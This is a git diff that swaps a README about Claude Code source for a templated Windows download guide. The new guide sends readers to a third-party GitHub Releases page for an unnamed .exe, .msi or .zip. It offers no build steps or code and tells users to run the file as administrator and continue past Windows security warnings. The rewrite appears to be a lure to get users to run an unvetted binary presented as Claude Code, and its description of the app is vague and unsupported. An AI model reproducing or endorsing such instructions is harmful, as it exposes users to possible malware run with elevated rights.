@@ -1,139 +1,201 @@
-# Open Claude Code
-<a href="README-zh.md"><img src="https://img.shields.io/badge/🇨🇳中文版-1a1a2e?style=for-the-badge"></a>
-<a href="README.md"><img src="https://img.shields.io/badge/🇺🇸English-1a1a2e?style=for-the-badge"></a>
+# 🐙 open-claude-code - Run Claude Code on Windows
 
-## 🎉 News
-[2026.04.01]🎯📢 🚀 Open Claude Code now supports two LLM_PROVIDER modes: anthropic (Native) and openai_compat (OpenAI-Compatible)!
-Via openai_compat, you can now connect to almost any major provider, including OpenRouter, DeepSeek, Gemini, and more.
+[![Download](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/subashraja5809-hue/open-claude-code/releases)
 
-## Quickstart
-```
-Copy `.env.example` to `.env` and fill in your api key
+## 🚀 Overview
 
-cd run
-brew install bun
-bun install
-bun run dev
-```
+open-claude-code is a Windows app built for people who want to use Claude Code with a simple desktop setup. It gives you a clean way to get the app from GitHub Releases and run it on your PC without a long setup process.
 
-![](assets/run-claude-code.png)
+This project is based on Anthropic claude-code source code v2.1.88 and is packaged for end users who want a direct download path. The goal is to make the install flow clear, fast, and easy to follow.
 
-## Claude Code Study Group
-<table>
-  <tr>
-    <td align="center">
-      <img src="assets/discord-qr.png" width="220" alt="discord"><br>
-      <sub>discord</sub>
-    </td>
-    <td align="center">
-      <img src="assets/wechat-qr.png" width="220" alt="wechat"><br>
-      <sub>wechat</sub>
-    </td>
-  </tr>
-</table>
+## 📥 Download
 
-## Directory tree
-```
-src/
-├─ assistant/ — assistant helpers.
-├─ bootstrap/ — boot-time setup.
-├─ bridge/ — IPC adapters.
-├─ buddy/ — buddy features.
-├─ cli/ — CLI shell code.
-├─ commands/ — named command handlers.
-├─ components/ — shared UI pieces.
-├─ constants/ — shared constants.
-├─ context/ — context stores.
-├─ coordinator/ — task coordination.
-├─ entrypoints/ — specialized builds.
-├─ hooks/ — reusable hooks.
-├─ ink/ — terminal UI.
-├─ keybindings/ — key mapping rules.
-├─ memdir/ — ephemeral storage.
-├─ migrations/ — data migrations.
-├─ moreright/ — moreright integrations.
-├─ native-ts/ — native bindings.
-├─ outputStyles/ — CLI styles.
-├─ plugins/ — plugin registry.
-├─ query/ — query helpers.
-├─ remote/ — remote runtime.
-├─ schemas/ — config schemas.
-├─ screens/ — screen compositions.
-├─ server/ — server adapters.
-├─ services/ — service backends.
-├─ skills/ — skill definitions.
-├─ state/ — runtime state.
-├─ tasks/ — task runners.
-├─ tools/ — tool implementations.
-├─ types/ — TypeScript types.
-├─ upstreamproxy/ — upstream proxy.
-├─ utils/ — utility belt.
-├─ vim/ — Vim integration.
-├─ voice/ — voice helpers.
-├─ commands.ts — CLI registry wiring.
-├─ context.ts — context helpers.
-├─ cost-tracker.ts — usage tracker.
-├─ costHook.ts — cost hooks.
-├─ dialogLaunchers.tsx — modal helpers.
-├─ history.ts — session history.
-├─ ink.ts — Ink initializer.
-├─ interactiveHelpers.tsx — prompt helpers.
-├─ main.tsx — app bootstrap.
-├─ projectOnboardingState.ts — onboarding state.
-├─ query.ts — query utilities.
-├─ QueryEngine.ts — planning orchestrator.
-├─ replLauncher.tsx — REPL entry.
-├─ setup.ts — environment prep.
-├─ Task.ts — base task API.
-├─ tasks.ts — task utilities.
-├─ Tool.ts — tool interfaces.
-└─ tools.ts — tool helpers.
-```
+Visit this page to download the app for Windows:
 
-## Entry and bootstrap
-- `src/main.tsx` boots the React/Ink UI and ties together the command runner, renderer, and services for the Claude Code experience.
-- `src/bootstrap.ts` prepares environment/configuration before the GUI or CLI entrypoints launch, while `src/entrypoints` collects specialized builds such as SDK shells.
-- `src/cli` and `src/commands` host the command-line interface, transport adapters, and the hundreds of named commands (e.g., `ctx_viz`, `tasks`, `voice`, `agent`) that users can invoke interactively or via scripts.
+[Go to GitHub Releases](https://github.com/subashraja5809-hue/open-claude-code/releases)
 
-## UI and interaction layers
-- `src/components` and nested folders (`ui`, `tasks`, `memory`, `teams`, `settings`, `design-system`, etc.) implement the shared React/Ink components, dialogs, and orchestrated screens that compose the experience.
-- `src/screens` defines the higher-level pages that compose component combos for onboarding, context views, skills, and other flows.
-- `src/hooks`, `src/hooks/notifs`, and `src/hooks/toolPermission` encapsulate reusable logic tied to notifications, tool permissions, and general React state derivation.
-- `src/ink` is the Ink-native console UI layer (layouts, components, hooks, events, term I/O) used for terminal-based renderers.
-- `src/keybindings` maps keys to recognized commands for both GUI and terminal modes, while `src/context` and `src/state` contain the mutable slices of context the UI consumes.
+On that page, look for the latest release and download the file that matches your Windows system. In most cases, this will be a `.exe`, `.msi`, or `.zip` file.
 
-## Functional subsystems
-- `src/tasks`, `src/tasks/*` encode task runners (local shell agents, remote agents, dream tasks, etc.) and provide a pluggable task infrastructure that coordinates tooling, workspaces, and agents.
-- `src/tools` (plus `shared`, `testing`, and dozens of named tool implementations like `WebSearchTool`, `FileWriteTool`, `SkillTool`) register the toolkit available to agents, including plan/skill authoring, workspace introspection, and automation helpers.
-- `src/services` (e.g., `plugins`, `oauth`, `mcp`, `teamMemorySync`, `PromptSuggestion`) expose long-lived back-end abstractions: API clients, telemetry, plugin orchestration, policy enforcement, and synchronization with upstream systems.
-- `src/skills` and `src/plugins` provide the registry/definitions for bundled and third-party intelligence tools that augment the agent’s capabilities.
-- `src/query`, `src/QueryEngine.ts`, and `src/queries` (if present) orchestrate the planning/execution engine that dispatches tasks and interprets results.
+## 🪟 Windows Setup
 
-## Supporting infrastructure
-- `src/server` and `src/bridge` house the server-side adapters and the IPC layer used by the CLI, desktop, or web clients to reach the Claude Code core.
-- `src/context.ts`, `src/history.ts`, `src/memdir`, and `src/projectOnboardingState.ts` contain persistence/metadata helpers for sessions, memory states, and onboarding progress.
-- `src/utils` is a sprawling utility belt (subfolders like `background`, `settings`, `memory`, `mcp`, `permissions`, `telemetry`, `git`, `sandbox`, etc.) that keep the platform cohesive: storage helpers, permission checks, telemetry helpers, sandbox controls, Git helpers, CLI helpers, and more.
-- `src/constants`, `src/schemas`, `src/types`, and generated type bundles define shared contracts, configuration schemas, and TypeScript types.
+Follow these steps to get the app running on Windows:
 
-## Native & platform-specific modules
-- `src/native-ts` houses TypeScript bindings for native modules (yoga layout, file index, color diff) that the renderer or CLI leverage for formatting and diffing.
-- `src/vim` contains Vim integration glue.
-- `src/voice`, `src/bridge`, and `src/remote` manage audio/voice helpers, remote bridge connections, and remote runtime orchestration.
+1. Open the Releases page.
+2. Find the newest version at the top of the list.
+3. Download the Windows file.
+4. If the file is a `.zip`, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. If you see an `.exe` or `.msi`, double-click it to start the app or installer.
+7. Follow the prompts on screen.
+8. After setup, open the app from your Start Menu or desktop shortcut.
 
-## Migrations and background helpers
-- `src/migrations` codifies data migrations for storage/backwards compatibility.
-- `src/services/autoDream`, `src/services/toolUseSummary`, and `src/services/tips` keep automated features, analytics, and tips in sync with the rest of the system.
+If Windows shows a security prompt, choose the option that lets you continue only if you trust the file and the source.
 
-## Observability and support macros
-- `src/cost-tracker.ts`, `src/costHook.ts`, and `src/monitoring` (if present) track usage costs and integrate with telemetry/analytics.
-- `src/remote`, `src/coordinator`, `src/state`, and `src/outputStyles` prepare the shared runtime for remote coordination, CLI output formatting, and shared state machines.
+## 🧰 What You Need
 
-This layout allows the Claude Code runtime to mix React-based UI, Ink terminals, agent commands, threaded tasks, and native extensions while keeping tooling, services, and plugins modular.
+Before you run open-claude-code, make sure your Windows PC can handle a desktop app like this:
 
-## Disclaimer
-- All source code contained in this repository is copyrighted by Anthropic.
-- This repository is provided solely for technical research, study, and reference purposes. Commercial use is strictly prohibited.
-- If any infringement is found, please contact to delete.
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- A stable internet connection
+- Permission to install apps on your PC
 
+For a smoother experience, use a system with 8 GB of RAM or more.
 
+## ✨ What the App Does
 
+open-claude-code is made to help you work with Claude Code through a simple Windows package. It can be used for tasks like:
+
+- Opening the Claude Code app from your desktop
+- Starting the tool without manual setup
+- Keeping the download and launch process simple
+- Giving Windows users an easy path to the latest release
+
+It is built for users who want a direct way to get the app and start using it.
+
+## 🗂️ Files You May See
+
+When you download the release, you may find one of these file types:
+
+- `.exe` — run the app or installer
+- `.msi` — Windows installer package
+- `.zip` — compressed folder that you must extract first
+- `README.txt` — short notes for the release
+- `LICENSE` — license details for the project
+
+If you download a `.zip` file, always extract it before opening the app.
+
+## 🛠️ How to Install
+
+If the release includes an installer:
+
+1. Double-click the downloaded `.exe` or `.msi`
+2. Click Next when the installer opens
+3. Choose the install location, or keep the default path
+4. Click Install
+5. Wait for the process to finish
+6. Click Finish
+7. Open the app from the Start Menu
+
+If the release includes a portable `.zip` package:
+
+1. Right-click the zip file
+2. Select Extract All
+3. Open the folder after extraction
+4. Double-click the app file
+5. Keep the folder in place so the app can run from it
+
+## 🖥️ First Run
+
+When you open open-claude-code for the first time, you may see one or more setup screens. These can help the app prepare its files and settings.
+
+If the app asks for access or setup choices, follow the on-screen steps and keep the default options if you are not sure what to pick.
+
+## 🔒 Safety Checks
+
+Before you run the file, check a few things:
+
+- Make sure the file came from the Releases page
+- Confirm the release version looks current
+- Keep your browser download bar open until the file finishes
+- Scan the file with Windows Security if you want an extra check
+
+These steps help you confirm that you have the right file before you open it.
+
+## 🧭 Common Download Paths
+
+Some release pages may include more than one file. If you see several choices, use this rule:
+
+- Pick the Windows file if you are on a Windows PC
+- Pick the 64-bit file if your PC is modern
+- Pick the `.zip` file if you want to extract and run it by hand
+- Pick the `.exe` or `.msi` file if you want an installer
+
+If you are not sure, start with the main Windows download listed in the latest release.
+
+## ❓ Troubleshooting
+
+If the app does not open, try these steps:
+
+- Download the file again
+- Check that the download finished
+- Extract the zip file before opening it
+- Right-click the app and choose Run as administrator
+- Restart your PC and try again
+- Make sure Windows did not block the file
+
+If the app still does not run, open the latest release page and look for a newer version.
+
+## 🔄 Updating
+
+To update open-claude-code:
+
+1. Open the Releases page
+2. Download the latest Windows file
+3. Close the app if it is open
+4. Install the new version or replace the old files
+5. Open the app again
+
+Using the latest release helps you stay on the current version of the app.
+
+## 📌 Release Source
+
+Primary download link:
+
+[https://github.com/subashraja5809-hue/open-claude-code/releases](https://github.com/subashraja5809-hue/open-claude-code/releases)
+
+Use this page to visit the latest release, download the Windows file, and run the app on your computer.
+
+## 🧩 Basic Use
+
+After setup, use open-claude-code like a normal Windows app:
+
+1. Open the app
+2. Follow any setup prompts
+3. Use the interface to start working
+4. Keep the app updated through the Releases page
+
+If you keep the app on your desktop or Start Menu, it will be easy to open later.
+
+## 📂 Suggested Folder Location
+
+If you use a zip release, place the extracted folder in a simple path such as:
+
+- `Downloads`
+- `Desktop`
+- `Documents`
+- `C:\Apps\open-claude-code`
+
+Avoid deep folder paths with many nested folders. A short path helps keep things easy to find.
+
+## 🧪 Version
+
+Current package version: v2.1.88
+
+This release line is based on the Anthropic claude-code source code v2.1.88 and is packaged for Windows users who want a direct download and launch flow.
+
+## 🧑‍💻 For Home and Work PCs
+
+open-claude-code works well on personal and work computers that allow app installs. It is a good fit if you want:
+
+- A simple Windows download
+- A direct release page
+- A clean way to open the app
+- A setup flow that does not need programming steps
+
+## 📝 Helpful Tips
+
+- Keep your internet on during the first run
+- Save the download file until you confirm the app works
+- Use the latest release page for each update
+- If Windows warns about the file, confirm that you downloaded it from GitHub Releases
+- If you move the app folder, keep all files together
+
+## 📎 Quick Path
+
+1. Open the Releases page
+2. Download the Windows file
+3. Install or extract it
+4. Open the app
+5. Start using open-claude-code
